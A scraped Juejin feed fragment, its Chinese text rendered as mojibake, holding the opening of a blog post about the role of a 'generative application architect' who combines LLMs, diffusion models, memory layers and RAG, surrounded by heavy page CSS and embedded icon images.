<p>ä»¥ä¸Šå°±æ˜¯æœ¬æ–‡çš„ä¸»è¦å†…å®¹<del>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©çš„è¯,æ¬¢è¿ç‚¹èµæ”¶è—</del></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ¤–âœ¨ ç”Ÿæˆå¼åº”ç”¨æ¶æ„å¸ˆçš„ä¿®ç‚¼æ‰‹å†Œ]]></title>    <link>https://juejin.cn/post/7588695570635587622</link>    <guid>https://juejin.cn/post/7588695570635587622</guid>    <pubDate>2025-12-29T04:14:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588695570635587622" data-draft-id="7588487605249425417" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ¤–âœ¨ ç”Ÿæˆå¼åº”ç”¨æ¶æ„å¸ˆçš„ä¿®ç‚¼æ‰‹å†Œ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LLM,AIGC"/> <meta itemprop="datePublished" content="2025-12-29T04:14:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ¤–âœ¨ ç”Ÿæˆå¼åº”ç”¨æ¶æ„å¸ˆçš„ä¿®ç‚¼æ‰‹å†Œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T04:14:13.000Z" title="Mon Dec 29 2025 04:14:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸŒ åºç« ï¼šå½“AIå¼€å§‹ä¼šå†™è¯—ã€ç”»ç”»ã€å†™ä»£ç â€¦â€¦</h2>
<p>äº²çˆ±çš„æœªæ¥<strong>ç”Ÿæˆå¼åº”ç”¨æ¶æ„å¸ˆï¼ˆGenerative Application Architectï¼‰</strong> ï¼Œ<br/>
å½“ä½ ç¬¬ä¸€æ¬¡çœ‹åˆ°ChatGPTå†™å‡ºä¸€ç¯‡æ¯”ä½ è®ºæ–‡è¿˜é€šé¡ºçš„æ–‡ç« ã€<br/>
çœ‹åˆ°Stable Diffusionåœ¨å‡ ç§’é’Ÿå†…ç”»å‡ºä½ å¿ƒä¸­çš„äºŒæ¬¡å…ƒè€å©†ï¼Œ<br/>
ä½ æœ‰æ²¡æœ‰è¿™æ ·æƒ³è¿‡ï¼š</p>
<blockquote>
<p>â€œæˆ‘èƒ½ä¸èƒ½æŠŠè¿™äº›AIè¿èµ·æ¥ï¼Œåšç‚¹æ›´å¤§çš„äº‹æƒ…ï¼Ÿâ€</p>
</blockquote>
<p>æ­å–œä½ ï¼Œè¿™ä¸ªå¿µå¤´ï¼Œå°±æ˜¯è¸å…¥<strong>ç”Ÿæˆå¼åº”ç”¨æ¶æ„</strong>ä¸–ç•Œçš„ç¬¬ä¸€æ­¥ã€‚<br/>
è¿™ä¸æ˜¯ç®€å•çš„â€œå¥—APIâ€ï¼Œ<br/>
è€Œæ˜¯ä¸€æ¬¡å¯¹<strong>è®¡ç®—æœºç³»ç»Ÿè®¾è®¡ç†å¿µ</strong>çš„é‡æ–°ç†è§£ã€‚ ğŸ§ âš™ï¸</p>
<hr/>
<h2 data-id="heading-1">ğŸ§© ç¬¬ä¸€ç« ï¼šä»€ä¹ˆæ˜¯ç”Ÿæˆå¼åº”ç”¨æ¶æ„å¸ˆï¼Ÿ</h2>
<p>ç”Ÿæˆå¼åº”ç”¨æ¶æ„å¸ˆï¼Œä¸åªæ˜¯ä¸€ä¸ªâ€œè°ƒæ¥å£çš„å·¥ç¨‹å¸ˆâ€ã€‚<br/>
ä»–æ˜¯ç«™åœ¨<strong>æ¨¡å‹ä¹‹ä¸Š</strong>çš„æŒ‡æŒ¥å®˜ï¼Œ<br/>
æ‡‚æ•°æ®æµã€æ‡‚ç®—åŠ›ã€æ‡‚ç¼“å­˜ï¼Œ<br/>
è¿˜èƒ½å’ŒAIä¸€èµ·å³å…´ Freestyle ğŸ¤™ã€‚</p>
<p>ä»–ä»¬çš„å·¥ä½œç›®æ ‡ï¼š</p>
<ul>
<li>å°†<strong>è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰</strong> ã€<strong>å›¾åƒç”Ÿæˆæ¨¡å‹ï¼ˆDiffusionï¼‰</strong> ã€<strong>è¯­éŸ³ç”Ÿæˆç³»ç»Ÿï¼ˆTTSï¼‰</strong> ã€<strong>æ¨ç†å™¨</strong>ç»„åˆæˆä¸€ä¸ªåå¥ç³»ç»Ÿï¼›</li>
<li>è®©æ•°æ®åƒè¡€æ¶²ä¸€æ ·æµåŠ¨ï¼Œ<br/>
æ¨¡å‹åƒå™¨å®˜ä¸€æ ·ååŒï¼Œ<br/>
æœ€ç»ˆæ„å»ºå‡ºä¸€ä¸ªâ€œAIç”Ÿå‘½ä½“â€ã€‚</li>
</ul>
<p>å¯ä»¥è¿™æ ·ç†è§£ï¼š</p>
<blockquote>
<p>â€œä¼ ç»Ÿæ¶æ„å¸ˆæ„å»ºçš„æ˜¯ç³»ç»Ÿï¼Œ<br/>
ç”Ÿæˆå¼æ¶æ„å¸ˆåŸ¹è‚²çš„æ˜¯æ™ºèƒ½ä½“ã€‚â€</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">ğŸ§  ç¬¬äºŒç« ï¼šçµé­‚ä¸‰é—® â€”â€” æ¨¡å‹ã€è®°å¿†ã€ä¸ä¸Šä¸‹æ–‡</h2>
<p>ä»»ä½•ç”Ÿæˆå¼ç³»ç»Ÿï¼Œåº•å±‚éƒ½éµå¾ªä¸€æ¡ç§˜å¯†æ³•åˆ™ï¼š</p>
<blockquote>
<p>â€œè¾“å…¥å†³å®šçµé­‚ï¼Œè¾“å‡ºå†³å®šå‘½è¿ã€‚â€</p>
</blockquote>
<p>è€Œè¿™ä¸€åˆ‡èƒŒåæ˜¯ä¸‰å¤§æ„ä»¶ï¼š</p>

























<table><thead><tr><th>æ„ä»¶</th><th>èŒè´£</th><th>ç±»æ¯”</th></tr></thead><tbody><tr><td><strong>æ¨¡å‹ï¼ˆModelï¼‰</strong></td><td>ç†è§£ä¸ç”Ÿæˆå†…å®¹çš„æ ¸å¿ƒ</td><td>å¤§è„‘</td></tr><tr><td><strong>è®°å¿†å±‚ï¼ˆMemory Layerï¼‰</strong></td><td>ç®¡ç†ä¸Šä¸‹æ–‡ä¸ä¼šè¯çŠ¶æ€</td><td>æµ·é©¬ä½“</td></tr><tr><td><strong>æ£€ç´¢å¢å¼ºï¼ˆRAGï¼‰</strong></td><td>è¡¥å……ä¸–ç•ŒçŸ¥è¯†</td><td>å›¾ä¹¦é¦†</td></tr></tbody></table>
<p>è¿™äº›æ¨¡å—é€šè¿‡**æç¤ºå·¥ç¨‹ï¼ˆPrompt Engineeringï¼‰<strong>å’Œ</strong>ä¸Šä¸‹æ–‡ç­–ç•¥ï¼ˆContextual Controlï¼‰**ç´§å¯†äº¤ç»‡ã€‚<br/>
å¥½çš„ç”Ÿæˆå¼æ¶æ„å¸ˆï¼Œè¦åƒè¯—äººä¸€æ ·æ„æ€Promptï¼Œ<br/>
